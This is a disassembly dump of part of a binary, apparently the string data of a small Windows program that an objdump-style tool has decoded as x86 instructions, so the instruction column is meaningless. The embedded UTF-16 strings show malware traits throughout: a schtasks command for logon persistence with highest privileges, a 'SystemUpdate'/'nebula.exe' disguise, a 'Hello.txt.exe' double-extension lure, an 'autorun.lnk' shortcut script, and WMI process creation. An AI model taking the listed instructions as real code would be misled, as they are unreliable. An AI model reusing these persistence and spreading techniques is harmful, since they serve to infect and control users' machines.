  40a6f4:	00 4f 00             	add    %cl,0x0(%edi)
  40a6f7:	4e                   	dec    %esi
  40a6f8:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40a6fc:	00 47 00             	add    %al,0x0(%edi)
  40a6ff:	4f                   	dec    %edi
  40a700:	00 4e 00             	add    %cl,0x0(%esi)
  40a703:	20 00                	and    %al,(%eax)
  40a705:	2f                   	das
  40a706:	00 52 00             	add    %dl,0x0(%edx)
  40a709:	4c                   	dec    %esp
  40a70a:	00 20                	add    %ah,(%eax)
  40a70c:	00 48 00             	add    %cl,0x0(%eax)
  40a70f:	49                   	dec    %ecx
  40a710:	00 47 00             	add    %al,0x0(%edi)
  40a713:	48                   	dec    %eax
  40a714:	00 45 00             	add    %al,0x0(%ebp)
  40a717:	53                   	push   %ebx
  40a718:	00 54 00 20          	add    %dl,0x20(%eax,%eax,1)
  40a71c:	00 2f                	add    %ch,(%edi)
  40a71e:	00 54 00 4e          	add    %dl,0x4e(%eax,%eax,1)
  40a722:	00 20                	add    %ah,(%eax)
  40a724:	00 22                	add    %ah,(%edx)
  40a726:	00 00                	add    %al,(%eax)
  40a728:	0f 22 00             	mov    %eax,%cr0
  40a72b:	20 00                	and    %al,(%eax)
  40a72d:	2f                   	das
  40a72e:	00 54 00 52          	add    %dl,0x52(%eax,%eax,1)
  40a732:	00 20                	add    %ah,(%eax)
  40a734:	00 22                	add    %ah,(%edx)
  40a736:	00 00                	add    %al,(%eax)
  40a738:	09 22                	or     %esp,(%edx)
  40a73a:	00 20                	add    %ah,(%eax)
  40a73c:	00 2f                	add    %ch,(%edi)
  40a73e:	00 46 00             	add    %al,0x0(%esi)
  40a741:	00 19                	add    %bl,(%ecx)
  40a743:	73 00                	jae    0x40a745
  40a745:	63 00                	arpl   %eax,(%eax)
  40a747:	68 00 74 00 61       	push   $0x61007400
  40a74c:	00 73 00             	add    %dh,0x0(%ebx)
  40a74f:	6b 00 73             	imul   $0x73,(%eax),%eax
  40a752:	00 2e                	add    %ch,(%esi)
  40a754:	00 65 00             	add    %ah,0x0(%ebp)
  40a757:	78 00                	js     0x40a759
  40a759:	65 00 00             	add    %al,%gs:(%eax)
  40a75c:	0b 2a                	or     (%edx),%ebp
  40a75e:	00 2e                	add    %ch,(%esi)
  40a760:	00 65 00             	add    %ah,0x0(%ebp)
  40a763:	78 00                	js     0x40a765
  40a765:	65 00 00             	add    %al,%gs:(%eax)
  40a768:	19 53 00             	sbb    %edx,0x0(%ebx)
  40a76b:	79 00                	jns    0x40a76d
  40a76d:	73 00                	jae    0x40a76f
  40a76f:	74 00                	je     0x40a771
  40a771:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40a775:	55                   	push   %ebp
  40a776:	00 70 00             	add    %dh,0x0(%eax)
  40a779:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40a77d:	74 00                	je     0x40a77f
  40a77f:	65 00 00             	add    %al,%gs:(%eax)
  40a782:	15 6e 00 65 00       	adc    $0x65006e,%eax
  40a787:	62 00                	bound  %eax,(%eax)
  40a789:	75 00                	jne    0x40a78b
  40a78b:	6c                   	insb   (%dx),%es:(%edi)
  40a78c:	00 61 00             	add    %ah,0x0(%ecx)
  40a78f:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a793:	78 00                	js     0x40a795
  40a795:	65 00 00             	add    %al,%gs:(%eax)
  40a798:	7d 61                	jge    0x40a7fb
  40a79a:	00 62 00             	add    %ah,0x0(%edx)
  40a79d:	63 00                	arpl   %eax,(%eax)
  40a79f:	64 00 65 00          	add    %ah,%fs:0x0(%ebp)
  40a7a3:	66 00 67 00          	data16 add %ah,0x0(%edi)
  40a7a7:	68 00 69 00 6a       	push   $0x6a006900
  40a7ac:	00 6b 00             	add    %ch,0x0(%ebx)
  40a7af:	6c                   	insb   (%dx),%es:(%edi)
  40a7b0:	00 6d 00             	add    %ch,0x0(%ebp)
  40a7b3:	6e                   	outsb  %ds:(%esi),(%dx)
  40a7b4:	00 6f 00             	add    %ch,0x0(%edi)
  40a7b7:	70 00                	jo     0x40a7b9
  40a7b9:	71 00                	jno    0x40a7bb
  40a7bb:	72 00                	jb     0x40a7bd
  40a7bd:	73 00                	jae    0x40a7bf
  40a7bf:	74 00                	je     0x40a7c1
  40a7c1:	75 00                	jne    0x40a7c3
  40a7c3:	76 00                	jbe    0x40a7c5
  40a7c5:	77 00                	ja     0x40a7c7
  40a7c7:	78 00                	js     0x40a7c9
  40a7c9:	79 00                	jns    0x40a7cb
  40a7cb:	7a 00                	jp     0x40a7cd
  40a7cd:	41                   	inc    %ecx
  40a7ce:	00 42 00             	add    %al,0x0(%edx)
  40a7d1:	43                   	inc    %ebx
  40a7d2:	00 44 00 45          	add    %al,0x45(%eax,%eax,1)
  40a7d6:	00 46 00             	add    %al,0x0(%esi)
  40a7d9:	47                   	inc    %edi
  40a7da:	00 48 00             	add    %cl,0x0(%eax)
  40a7dd:	49                   	dec    %ecx
  40a7de:	00 4a 00             	add    %cl,0x0(%edx)
  40a7e1:	4b                   	dec    %ebx
  40a7e2:	00 4c 00 4d          	add    %cl,0x4d(%eax,%eax,1)
  40a7e6:	00 4e 00             	add    %cl,0x0(%esi)
  40a7e9:	4f                   	dec    %edi
  40a7ea:	00 50 00             	add    %dl,0x0(%eax)
  40a7ed:	51                   	push   %ecx
  40a7ee:	00 52 00             	add    %dl,0x0(%edx)
  40a7f1:	53                   	push   %ebx
  40a7f2:	00 54 00 55          	add    %dl,0x55(%eax,%eax,1)
  40a7f6:	00 56 00             	add    %dl,0x0(%esi)
  40a7f9:	57                   	push   %edi
  40a7fa:	00 58 00             	add    %bl,0x0(%eax)
  40a7fd:	59                   	pop    %ecx
  40a7fe:	00 5a 00             	add    %bl,0x0(%edx)
  40a801:	30 00                	xor    %al,(%eax)
  40a803:	31 00                	xor    %eax,(%eax)
  40a805:	32 00                	xor    (%eax),%al
  40a807:	33 00                	xor    (%eax),%eax
  40a809:	34 00                	xor    $0x0,%al
  40a80b:	35 00 36 00 37       	xor    $0x37003600,%eax
  40a810:	00 38                	add    %bh,(%eax)
  40a812:	00 39                	add    %bh,(%ecx)
  40a814:	00 00                	add    %al,(%eax)
  40a816:	1b 48 00             	sbb    0x0(%eax),%ecx
  40a819:	65 00 6c 00 6c       	add    %ch,%gs:0x6c(%eax,%eax,1)
  40a81e:	00 6f 00             	add    %ch,0x0(%edi)
  40a821:	2e 00 74 00 78       	add    %dh,%cs:0x78(%eax,%eax,1)
  40a826:	00 74 00 2e          	add    %dh,0x2e(%eax,%eax,1)
  40a82a:	00 65 00             	add    %ah,0x0(%ebp)
  40a82d:	78 00                	js     0x40a82f
  40a82f:	65 00 00             	add    %al,%gs:(%eax)
  40a832:	17                   	pop    %ss
  40a833:	61                   	popa
  40a834:	00 75 00             	add    %dh,0x0(%ebp)
  40a837:	74 00                	je     0x40a839
  40a839:	6f                   	outsl  %ds:(%esi),(%dx)
  40a83a:	00 72 00             	add    %dh,0x0(%edx)
  40a83d:	75 00                	jne    0x40a83f
  40a83f:	6e                   	outsb  %ds:(%esi),(%dx)
  40a840:	00 2e                	add    %ch,(%esi)
  40a842:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40a846:	00 6b 00             	add    %ch,0x0(%ebx)
  40a849:	00 80 9d 22 00 0d    	add    %al,0xd00229d(%eax)
  40a84f:	00 0a                	add    %cl,(%edx)
  40a851:	00 6f 00             	add    %ch,0x0(%edi)
  40a854:	4c                   	dec    %esp
  40a855:	00 69 00             	add    %ch,0x0(%ecx)
  40a858:	6e                   	outsb  %ds:(%esi),(%dx)
  40a859:	00 6b 00             	add    %ch,0x0(%ebx)
  40a85c:	2e 00 57 00          	add    %dl,%cs:0x0(%edi)
  40a860:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a866:	6f                   	outsl  %ds:(%esi),(%dx)
  40a867:	00 77 00             	add    %dh,0x0(%edi)
  40a86a:	53                   	push   %ebx
  40a86b:	00 74 00 79          	add    %dh,0x79(%eax,%eax,1)
  40a86f:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40a873:	00 20                	add    %ah,(%eax)
  40a875:	00 3d 00 20 00 31    	add    %bh,0x31002000
  40a87b:	00 0d 00 0a 00 6f    	add    %cl,0x6f000a00
  40a881:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a885:	00 6e 00             	add    %ch,0x0(%esi)
  40a888:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a88b:	00 44 00 65          	add    %al,0x65(%eax,%eax,1)
  40a88f:	00 73 00             	add    %dh,0x0(%ebx)
  40a892:	63 00                	arpl   %eax,(%eax)
  40a894:	72 00                	jb     0x40a896
  40a896:	69 00 70 00 74 00    	imul   $0x740070,(%eax),%eax
  40a89c:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40a8a2:	20 00                	and    %al,(%eax)
  40a8a4:	3d 00 20 00 22       	cmp    $0x22002000,%eax
  40a8a9:	00 57 00             	add    %dl,0x0(%edi)
  40a8ac:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40a8b2:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8b3:	00 77 00             	add    %dh,0x0(%edi)
  40a8b6:	73 00                	jae    0x40a8b8
  40a8b8:	20 00                	and    %al,(%eax)
  40a8ba:	53                   	push   %ebx
  40a8bb:	00 68 00             	add    %ch,0x0(%eax)
  40a8be:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8bf:	00 72 00             	add    %dh,0x0(%edx)
  40a8c2:	74 00                	je     0x40a8c4
  40a8c4:	63 00                	arpl   %eax,(%eax)
  40a8c6:	75 00                	jne    0x40a8c8
  40a8c8:	74 00                	je     0x40a8ca
  40a8ca:	22 00                	and    (%eax),%al
  40a8cc:	0d 00 0a 00 6f       	or     $0x6f000a00,%eax
  40a8d1:	00 4c 00 69          	add    %cl,0x69(%eax,%eax,1)
  40a8d5:	00 6e 00             	add    %ch,0x0(%esi)
  40a8d8:	6b 00 2e             	imul   $0x2e,(%eax),%eax
  40a8db:	00 53 00             	add    %dl,0x0(%ebx)
  40a8de:	61                   	popa
  40a8df:	00 76 00             	add    %dh,0x0(%esi)
  40a8e2:	65 00 0d 00 0a 00 00 	add    %cl,%gs:0xa00
  40a8e9:	09 74 00 65          	or     %esi,0x65(%eax,%eax,1)
  40a8ed:	00 6d 00             	add    %ch,0x0(%ebp)
  40a8f0:	70 00                	jo     0x40a8f2
  40a8f2:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40a8f8:	00 17                	add    %dl,(%edi)
  40a8fa:	5c                   	pop    %esp
  40a8fb:	00 72 00             	add    %dh,0x0(%edx)
  40a8fe:	6f                   	outsl  %ds:(%esi),(%dx)
  40a8ff:	00 6f 00             	add    %ch,0x0(%edi)
  40a902:	74 00                	je     0x40a904
  40a904:	5c                   	pop    %esp
  40a905:	00 63 00             	add    %ah,0x0(%ebx)
  40a908:	69 00 6d 00 76 00    	imul   $0x76006d,(%eax),%eax
  40a90e:	32 00                	xor    (%eax),%al
  40a910:	00 1b                	add    %bl,(%ebx)
  40a912:	57                   	push   %edi
  40a913:	00 69 00             	add    %ch,0x0(%ecx)
  40a916:	6e                   	outsb  %ds:(%esi),(%dx)
  40a917:	00 33                	add    %dh,(%ebx)
  40a919:	00 32                	add    %dh,(%edx)
  40a91b:	00 5f 00             	add    %bl,0x0(%edi)
  40a91e:	50                   	push   %eax
  40a91f:	00 72 00             	add    %dh,0x0(%edx)
  40a922:	6f                   	outsl  %ds:(%esi),(%dx)
  40a923:	00 63 00             	add    %ah,0x0(%ebx)
  40a926:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40a92a:	73 00                	jae    0x40a92c
  40a92c:	00 0d 43 00 72 00    	add    %cl,0x720043
  40a932:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40a936:	74 00                	je     0x40a938
  40a938:	65 00 00             	add    %al,%gs:(%eax)
  40a93b:	17                   	pop    %ss
  40a93c:	43                   	inc    %ebx
  40a93d:	00 6f 00             	add    %ch,0x0(%edi)
  40a940:	6d                   	insl   (%dx),%es:(%edi)
  40a941:	00 6d 00             	add    %ch,0x0(%ebp)
  40a944:	61                   	popa
  40a945:	00 6e 00             	add    %ch,0x0(%esi)
  40a948:	64 00 4c 00 69       	add    %cl,%fs:0x69(%eax,%eax,1)
  40a94d:	00 6e 00             	add    %ch,0x0(%esi)
  40a950:	65 00 00             	add    %al,%gs:(%eax)
  40a953:	0f 7b                	(bad)
  40a955:	00 30                	add    %dh,(%eax)
  40a957:	00 7d 00             	add    %bh,0x0(%ebp)
  40a95a:	2e 00 7b 00          	add    %bh,%cs:0x0(%ebx)
  40a95e:	31 00                	xor    %eax,(%eax)
  40a960:	7d 00                	jge    0x40a962
  40a962:	00 0f                	add    %cl,(%edi)
  40a964:	38 00                	cmp    %al,(%eax)
  40a966:	2e 00 38             	add    %bh,%cs:(%eax)
  40a969:	00 2e                	add    %ch,(%esi)
  40a96b:	00 38                	add    %bh,(%eax)
  40a96d:	00 2e                	add    %ch,(%esi)
  40a96f:	00 38                	add    %bh,(%eax)
  40a971:	00 00                	add    %al,(%eax)
  40a973:	03 5c 00 00          	add    0x0(%eax,%eax,1),%ebx
  40a977:	17                   	pop    %ss
  40a978:	5c                   	pop    %esp
  40a979:	00 6e 00             	add    %ch,0x0(%esi)
  40a97c:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40a980:	75 00                	jne    0x40a982
  40a982:	6c                   	insb   (%dx),%es:(%edi)
  40a983:	00 61 00             	add    %ah,0x0(%ecx)
  40a986:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  40a98a:	78 00                	js     0x40a98c
  40a98c:	65 00 00             	add    %al,%gs:(%eax)
  40a98f:	00 d5                	add    %dl,%ch
  40a991:	24 30                	and    $0x30,%al
  40a993:	0f 3c                	(bad)
  40a995:	4d                   	dec    %ebp
  40a996:	d0 4d 9c             	rorb   $1,-0x64(%ebp)
  40a999:	77 d6                	ja     0x40a971
  40a99b:	7f 2d                	jg     0x40a9ca
  40a99d:	8d 60 8b             	lea    -0x75(%eax),%esp
  40a9a0:	00 04 20             	add    %al,(%eax,%eiz,1)
  40a9a3:	01 01                	add    %eax,(%ecx)
  40a9a5:	08 03                	or     %al,(%ebx)
  40a9a7:	20 00                	and    %al,(%eax)
  40a9a9:	01 05 20 01 01 11    	add    %eax,0x11010120
  40a9af:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  40a9b2:	01 01                	add    %eax,(%ecx)
  40a9b4:	0e                   	push   %cs
  40a9b5:	04 20                	add    $0x20,%al
  40a9b7:	01 01                	add    %eax,(%ecx)
  40a9b9:	02 05 20 01 01 11    	add    0x11010120,%al
  40a9bf:	41                   	inc    %ecx
  40a9c0:	06                   	push   %es
  40a9c1:	20 01                	and    %al,(%ecx)
  40a9c3:	01 12                	add    %edx,(%edx)
  40a9c5:	80 95 06 20 01 01 12 	adcb   $0x12,0x1012006(%ebp)
  40a9cc:	80 e5 03             	and    $0x3,%ch
  40a9cf:	06                   	push   %es
  40a9d0:	12 51 05             	adc    0x5(%ecx),%dl
  40a9d3:	20 01                	and    %al,(%ecx)
  40a9d5:	12 51 0e             	adc    0xe(%ecx),%dl
  40a9d8:	08 20                	or     %ah,(%eax)
  40a9da:	03 01                	add    (%ecx),%eax
  40a9dc:	0e                   	push   %cs
  40a9dd:	1c 11                	sbb    $0x11,%al
  40a9df:	81 21 07 00 01 12    	andl   $0x12010007,(%ecx)
  40a9e5:	65 12 81 25 06 07 03 	adc    %gs:0x3070625(%ecx),%al
  40a9ec:	18 09                	sbb    %cl,(%ecx)
  40a9ee:	1d 05 04 00 01       	sbb    $0x1000405,%eax
  40a9f3:	19 0b                	sbb    %ecx,(%ebx)
  40a9f5:	09 00                	or     %eax,(%eax)
  40a9f7:	02 01                	add    (%ecx),%al
  40a9f9:	12 81 35 11 81 39    	adc    0x39811135(%ecx),%al
  40a9ff:	08 00                	or     %al,(%eax)
  40aa01:	04 01                	add    $0x1,%al
  40aa03:	1d 05 08 18 08       	sbb    $0x8180805,%eax
  40aa08:	04 00                	add    $0x0,%al
  40aa0a:	01 02                	add    %eax,(%edx)
  40aa0c:	0e                   	push   %cs
  40aa0d:	0e                   	push   %cs
  40aa0e:	07                   	pop    %es
  40aa0f:	09 0e                	or     %ecx,(%esi)
  40aa11:	0e                   	push   %cs
  40aa12:	12 51 1d             	adc    0x1d(%ecx),%dl
  40aa15:	0e                   	push   %cs
  40aa16:	08 0e                	or     %cl,(%esi)
  40aa18:	0e                   	push   %cs
  40aa19:	1d 0e 08 06 00       	sbb    $0x6080e,%eax
  40aa1e:	02 12                	add    (%edx),%dl
  40aa20:	65 0e                	gs push %cs
  40aa22:	0e                   	push   %cs
  40aa23:	06                   	push   %es
  40aa24:	20 02                	and    %al,(%edx)
  40aa26:	12 51 0e             	adc    0xe(%ecx),%dl
  40aa29:	02 04 20             	add    (%eax,%eiz,1),%al
  40aa2c:	00 1d 0e 05 20 02    	add    %bl,0x220050e
  40aa32:	01 0e                	add    %ecx,(%esi)
  40aa34:	02 06                	add    (%esi),%al
  40aa36:	00 01                	add    %al,(%ecx)
  40aa38:	0e                   	push   %cs
  40aa39:	11 81 49 05 00 02    	adc    %eax,0x2000549(%ecx)
  40aa3f:	0e                   	push   %cs
  40aa40:	0e                   	push   %cs
  40aa41:	0e                   	push   %cs
  40aa42:	05 00 02 01 0e       	add    $0xe010200,%eax
  40aa47:	02 04 00             	add    (%eax,%eax,1),%al
  40aa4a:	00 1d 0e 09 00 03    	add    %bl,0x300090e
  40aa50:	1d 0e 0e 0e 11       	sbb    $0x110e0e0e,%eax
  40aa55:	81 55 04 00 01 01 0e 	adcl   $0xe010100,0x4(%ebp)
  40aa5c:	04 00                	add    $0x0,%al
  40aa5e:	00 12                	add    %dl,(%edx)
  40aa60:	65 05 20 00 12 81    	gs add $0x81120020,%eax
  40aa66:	59                   	pop    %ecx
  40aa67:	03 20                	add    (%eax),%esp
  40aa69:	00 0e                	add    %cl,(%esi)
  40aa6b:	06                   	push   %es
  40aa6c:	00 03                	add    %al,(%ebx)
  40aa6e:	0e                   	push   %cs
  40aa6f:	0e                   	push   %cs
  40aa70:	0e                   	push   %cs
  40aa71:	0e                   	push   %cs
  40aa72:	05 20 02 01 1c       	add    $0x1c010220,%eax
  40aa77:	18 05 20 01 01 12    	sbb    %al,0x12010120
  40aa7d:	5d                   	pop    %ebp
  40aa7e:	0a 07                	or     (%edi),%al
  40aa80:	05 12 64 08 11       	add    $0x11086412,%eax
  40aa85:	59                   	pop    %ecx
  40aa86:	08 12                	or     %dl,(%edx)
  40aa88:	5d                   	pop    %ebp
  40aa89:	05 20 02 08 08       	add    $0x8080220,%eax
  40aa8e:	08 04 00             	or     %al,(%eax,%eax,1)
  40aa91:	01 01                	add    %eax,(%ecx)
  40aa93:	08 04 00             	or     %al,(%eax,%eax,1)
  40aa96:	00 11                	add    %dl,(%ecx)
  40aa98:	59                   	pop    %ecx
  40aa99:	05 20 01 11 59       	add    $0x59110120,%eax
  40aa9e:	0d 03 00 00 08       	or     $0x8000003,%eax
  40aaa3:	07                   	pop    %es
  40aaa4:	00 02                	add    %al,(%edx)
  40aaa6:	02 11                	add    (%ecx),%dl
  40aaa8:	59                   	pop    %ecx
  40aaa9:	11 59 05             	adc    %ebx,0x5(%ecx)
  40aaac:	07                   	pop    %es
  40aaad:	02 1d 05 08 03 20    	add    0x20030805,%bl
  40aab3:	00 08                	add    %cl,(%eax)
  40aab5:	05 20 02 0e 08       	add    $0x80e0220,%eax
  40aaba:	08 05 00 02 05 0e    	or     %al,0xe050200
  40aac0:	08 09                	or     %cl,(%ecx)
  40aac2:	07                   	pop    %es
  40aac3:	06                   	push   %es
  40aac4:	12 65 18             	adc    0x18(%ebp),%ah
  40aac7:	18 18                	sbb    %bl,(%eax)
  40aac9:	02 18                	add    (%eax),%bl
  40aacb:	05 00 01 12 65       	add    $0x65120100,%eax
  40aad0:	0e                   	push   %cs
  40aad1:	03 20                	add    (%eax),%esp
  40aad3:	00 02                	add    %al,(%edx)
  40aad5:	02 06                	add    (%esi),%al
  40aad7:	18 05 00 02 02 18    	sbb    %al,0x18020200
  40aadd:	18 04 07             	sbb    %al,(%edi,%eax,1)
  40aae0:	01 1d 05 06 07 03    	add    %ebx,0x3070605
  40aae6:	1d 05 18 09 03       	sbb    $0x3091805,%eax
  40aaeb:	00 00                	add    %al,(%eax)
  40aaed:	0e                   	push   %cs
  40aaee:	05 00 01 1d 05       	add    $0x51d0100,%eax
  40aaf3:	0e                   	push   %cs
  40aaf4:	07                   	pop    %es
  40aaf5:	07                   	pop    %es
  40aaf6:	03 0e                	add    (%esi),%ecx
  40aaf8:	12 6d 12             	adc    0x12(%ebp),%ch
  40aafb:	6d                   	insl   (%dx),%es:(%edi)
  40aafc:	0c 20                	or     $0x20,%al
  40aafe:	03 01                	add    (%ecx),%eax
  40ab00:	12 80 d5 12 81 71    	adc    0x718112d5(%eax),%al
  40ab06:	12 81 75 04 20 00    	adc    0x200475(%ecx),%al
  40ab0c:	12 6d 05             	adc    0x5(%ebp),%ch
  40ab0f:	20 02                	and    %al,(%edx)
  40ab11:	01 0e                	add    %ecx,(%esi)
  40ab13:	1c 05                	sbb    $0x5,%al
  40ab15:	20 00                	and    %al,(%eax)
  40ab17:	12 81 71 03 07 01    	adc    0x1070371(%ecx),%al
  40ab1d:	02 05 20 00 12 81    	add    0x81120020,%al
  40ab23:	79 08                	jns    0x40ab2d
  40ab25:	07                   	pop    %es
  40ab26:	04 12                	add    $0x12,%al
  40ab28:	75 0e                	jne    0x40ab38
  40ab2a:	0e                   	push   %cs
  40ab2b:	1d 05 05 20 00       	sbb    $0x200505,%eax
  40ab30:	12 81 7d 04 20 00    	adc    0x20047d(%ecx),%al
  40ab36:	12 75 05             	adc    0x5(%ebp),%dh
  40ab39:	20 00                	and    %al,(%eax)
  40ab3b:	12 81 81 05 20 00    	adc    0x200581(%ecx),%al
  40ab41:	12 81 85 04 20 01    	adc    0x1200485(%ecx),%al
  40ab47:	0e                   	push   %cs
  40ab48:	0e                   	push   %cs
  40ab49:	05 00 00 12 81       	add    $0x81120000,%eax
  40ab4e:	89 05 20 01 1d 05    	mov    %eax,0x51d0120
  40ab54:	0e                   	push   %cs
  40ab55:	05 20 00 12 81       	add    $0x81120020,%eax
  40ab5a:	8d 07                	lea    (%edi),%eax
  40ab5c:	20 03                	and    %al,(%ebx)
  40ab5e:	01 1d 05 08 08 06    	add    %ebx,0x6080805
  40ab64:	07                   	pop    %es
  40ab65:	03 0e                	add    (%esi),%ecx
  40ab67:	0e                   	push   %cs
  40ab68:	12 69 05             	adc    0x5(%ecx),%ch
  40ab6b:	20 00                	and    %al,(%eax)
  40ab6d:	12 81 25 05 20 00    	adc    0x200525(%ecx),%al
  40ab73:	12 80 b5 06 07 03    	adc    0x30706b5(%eax),%al
  40ab79:	0e                   	push   %cs
  40ab7a:	0e                   	push   %cs
  40ab7b:	12 51 06             	adc    0x6(%ecx),%dl
  40ab7e:	20 01                	and    %al,(%ecx)
  40ab80:	01 11                	add    %edx,(%ecx)
  40ab82:	81 99 03 00 00 02 0b 	sbbl   $0x1d05070b,0x2000003(%ecx)
  40ab89:	07 05 1d 
  40ab8c:	12 65 08             	adc    0x8(%ebp),%ah
  40ab8f:	12 65 12             	adc    0x12(%ebp),%ah
  40ab92:	6c                   	insb   (%dx),%es:(%edi)
  40ab93:	02 05 00 00 1d 12    	add    0x121d0000,%al
  40ab99:	65 07                	gs pop %es
  40ab9b:	15 12 81 a1 02       	adc    $0x2a18112,%eax
  40aba0:	0e                   	push   %cs
  40aba1:	02 13                	add    (%ebx),%dl
  40aba3:	10 01                	adc    %al,(%ecx)
  40aba5:	02 02                	add    (%edx),%al
  40aba7:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40abac:	1e                   	push   %ds
  40abad:	00 15 12 81 a1 02    	add    %dl,0x2a18112
  40abb3:	1e                   	push   %ds
  40abb4:	00 02                	add    %al,(%edx)
  40abb6:	03 0a                	add    (%edx),%ecx
  40abb8:	01 0e                	add    %ecx,(%esi)
  40abba:	0b 07                	or     (%edi),%eax
  40abbc:	05 1d 12 65 08       	add    $0x865121d,%eax
  40abc1:	12 65 12             	adc    0x12(%ebp),%ah
  40abc4:	70 02                	jo     0x40abc8
  40abc6:	0d 07 05 12 79       	or     $0x79120507,%eax
  40abcb:	12 80 81 12 80 85    	adc    -0x7a7fed7f(%eax),%al
  40abd1:	12 74 02 04          	adc    0x4(%edx,%eax,1),%dh
  40abd5:	20 00                	and    %al,(%eax)
  40abd7:	12 7d 05             	adc    0x5(%ebp),%bh
  40abda:	20 00                	and    %al,(%eax)
  40abdc:	12 80 81 05 20 00    	adc    0x200581(%eax),%al
  40abe2:	12 80 85 04 20 01    	adc    0x1200485(%eax),%al
  40abe8:	1c 0e                	sbb    $0xe,%al
  40abea:	06                   	push   %es
  40abeb:	07                   	pop    %es
  40abec:	03 12                	add    (%edx),%edx
  40abee:	51                   	push   %ecx
  40abef:	1c 02                	sbb    $0x2,%al
  40abf1:	05 00 00 12 81       	add    $0x81120000,%eax
  40abf6:	ad                   	lods   %ds:(%esi),%eax
  40abf7:	03 20                	add    (%eax),%esp
  40abf9:	00 0a                	add    %cl,(%edx)
  40abfb:	0d 07 05 1d 12       	or     $0x121d0507,%eax
  40ac00:	80 89 08 12 80 89 12 	orb    $0x12,-0x767fedf8(%ecx)
  40ac07:	68 02 06 00 00       	push   $0x602
  40ac0c:	1d 12 80 89 05       	sbb    $0x5898012,%eax
  40ac11:	20 00                	and    %al,(%eax)
  40ac13:	12 81 b1 0a 00 02    	adc    0x2000ab1(%ecx),%al
  40ac19:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40ac1e:	08 08                	or     %cl,(%eax)
  40ac20:	08 07                	or     %al,(%edi)
  40ac22:	15 12 81 a1 02       	adc    $0x2a18112,%eax
  40ac27:	08 0e                	or     %cl,(%esi)
  40ac29:	1a 10                	sbb    (%eax),%dl
  40ac2b:	02 02                	add    (%edx),%al
  40ac2d:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40ac32:	1e                   	push   %ds
  40ac33:	01 15 12 81 a9 01    	add    %edx,0x1a98112
  40ac39:	1e                   	push   %ds
  40ac3a:	00 15 12 81 a1 02    	add    %dl,0x2a18112
  40ac40:	1e                   	push   %ds
  40ac41:	00 1e                	add    %bl,(%esi)
  40ac43:	01 04 0a             	add    %eax,(%edx,%ecx,1)
  40ac46:	02 08                	add    (%eax),%cl
  40ac48:	0e                   	push   %cs
  40ac49:	0a 00                	or     (%eax),%al
  40ac4b:	02 0e                	add    (%esi),%cl
  40ac4d:	0e                   	push   %cs
  40ac4e:	15 12 81 a9 01       	adc    $0x1a98112,%eax
  40ac53:	0e                   	push   %cs
  40ac54:	0a 07                	or     (%edi),%al
  40ac56:	05 12 79 12 80       	add    $0x80127912,%eax
  40ac5b:	81 0e 0e 02 04 20    	orl    $0x2004020e,(%esi)
  40ac61:	01 02                	add    %eax,(%edx)
  40ac63:	0e                   	push   %cs
  40ac64:	0a 07                	or     (%edi),%al
  40ac66:	04 12                	add    $0x12,%al
  40ac68:	79 12                	jns    0x40ac7c
  40ac6a:	80 81 02 12 79 04 00 	addb   $0x0,0x4791202(%ecx)
  40ac71:	01 0b                	add    %ecx,(%ebx)
  40ac73:	1c 09                	sbb    $0x9,%al
  40ac75:	07                   	pop    %es
  40ac76:	06                   	push   %es
  40ac77:	0e                   	push   %cs
  40ac78:	0e                   	push   %cs
  40ac79:	1d 0e 08 0e 0e       	sbb    $0xe0e080e,%eax
  40ac7e:	03 07                	add    (%edi),%eax
  40ac80:	01 0e                	add    %ecx,(%esi)
  40ac82:	08 07                	or     %al,(%edi)
  40ac84:	04 0e                	add    $0xe,%al
  40ac86:	0e                   	push   %cs
  40ac87:	0e                   	push   %cs
  40ac88:	11 80 8d 04 00 01    	adc    %eax,0x100048d(%eax)
  40ac8e:	0e                   	push   %cs
  40ac8f:	0e                   	push   %cs
  40ac90:	05 00 01 0e 1d       	add    $0x1d0e0100,%eax
  40ac95:	0e                   	push   %cs
  40ac96:	05 00 00 11 80       	add    $0x80110000,%eax
  40ac9b:	8d 05 00 02 01 0e    	lea    0xe010200,%eax
  40aca1:	0e                   	push   %cs
  40aca2:	05 07 01 11 80       	add    $0x80110107,%eax
  40aca7:	88 05 00 00 11 80    	mov    %al,0x80110000
  40acad:	ed                   	in     (%dx),%eax
  40acae:	07                   	pop    %es
  40acaf:	30 01                	xor    %al,(%ecx)
  40acb1:	01 01                	add    %eax,(%ecx)
  40acb3:	10 1e                	adc    %bl,(%esi)
  40acb5:	00 05 0a 01 11 80    	add    %al,0x8011010a
  40acbb:	88 05 20 00 12 80    	mov    %al,0x80120020
  40acc1:	9d                   	popf
  40acc2:	08 07                	or     %al,(%edi)
  40acc4:	03 12                	add    (%edx),%edx
  40acc6:	80 a1 1d 05 02 0c 20 	andb   $0x20,0xc02051d(%ecx)
  40accd:	03 01                	add    (%ecx),%eax
  40accf:	11 81 b9 11 81 bd    	adc    %eax,-0x427eee47(%ecx)
  40acd5:	11 81 c1 05 20 02    	adc    %eax,0x22005c1(%ecx)
  40acdb:	01 0e                	add    %ecx,(%esi)
  40acdd:	08 05 20 01 08 1d    	or     %al,0x1d080120
  40ace3:	05 13 07 07 12       	add    $0x12070713,%eax
  40ace8:	80 a9 12 80 ad 12 80 	subb   $0x80,0x12ad8012(%ecx)
  40acef:	b1 12                	mov    $0x12,%cl
